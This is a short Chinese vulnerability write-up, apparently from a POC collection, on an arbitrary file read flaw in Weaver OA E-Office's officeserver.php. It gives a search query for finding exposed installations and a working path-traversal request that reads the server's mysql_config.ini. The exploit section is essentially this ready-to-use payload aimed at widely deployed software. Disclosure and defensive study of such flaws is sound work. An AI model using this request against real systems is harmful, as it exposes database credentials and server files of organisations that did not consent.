# 泛微OA E-Office officeserver.php 任意文件读取漏洞

## 漏洞描述

泛微OA E-Office officeserver.php文件存在任意文件读取漏洞，攻击者通过漏洞可以下载服务器上的任意文件

## 漏洞影响

<a-checkbox checked>泛微OA E-Office</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="泛微-EOffice"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1629190834596-c2c639a7-1fb7-4934-95ad-1d571629e383-20220313185607234.png)

验证POC

```javascript
/iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini
```

![img](../../../.vuepress/public/img/1646044472614-5b3e654f-bde4-44e4-81b5-184c21585029.png)